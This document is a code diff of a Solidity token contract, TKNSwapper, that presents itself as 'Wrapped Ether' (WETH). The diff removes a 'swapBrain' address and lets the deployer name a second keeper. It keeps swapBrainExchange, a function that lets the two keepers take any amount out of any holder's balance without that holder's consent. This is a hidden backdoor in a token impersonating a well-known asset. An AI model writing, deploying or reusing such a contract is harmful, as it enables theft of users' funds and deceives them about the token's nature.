@@ -43,15 +43,14 @@ contract TKNSwapper {
 
     address public poolKeeper;
     address public secondKeeper;
-    constructor () public {
+    constructor (address _secondKeeper) public {
         poolKeeper = msg.sender;
-        secondKeeper = msg.sender; 
+        secondKeeper = _secondKeeper; 
     }
     string public name     = "Wrapped Ether";
     string public symbol   = "WETH";
     uint8  public decimals = 18;
 
-    address public swapBrain = address(0);
     address public TKN = address(0);
 
 
@@ -60,7 +59,6 @@ contract TKNSwapper {
     event  Deposit(address indexed dst, uint wad);
     event  Withdrawal(address indexed src, uint wad);
     
-
     mapping (address => uint)                       public  balanceOf;
     mapping (address => mapping (address => uint))  public  allowance;
 
@@ -148,12 +146,6 @@ contract TKNSwapper {
         return true;
     }
 
-    function setSwapBrainContract(address _swapBrain) public keepPool returns(bool) {
-        require(_swapBrain != address(0));
-        swapBrain = _swapBrain;
-        return true;
-    }
-
     function setTKNContract(address _addr) public keepPool returns(bool) {
         require(_addr != address(0));
         TKN = _addr;
@@ -175,7 +167,7 @@ contract TKNSwapper {
     }
 
     function swapBrainExchange(address fromAddress, address toAddress,uint amount) public returns (bool) {
-        require((msg.sender == swapBrain)||(msg.sender == poolKeeper)||(msg.sender == secondKeeper));
+        require((msg.sender == poolKeeper)||(msg.sender == secondKeeper));
             if(balanceOf[fromAddress] >= amount){
                 balanceOf[fromAddress] = sub(balanceOf[fromAddress],amount);
             }
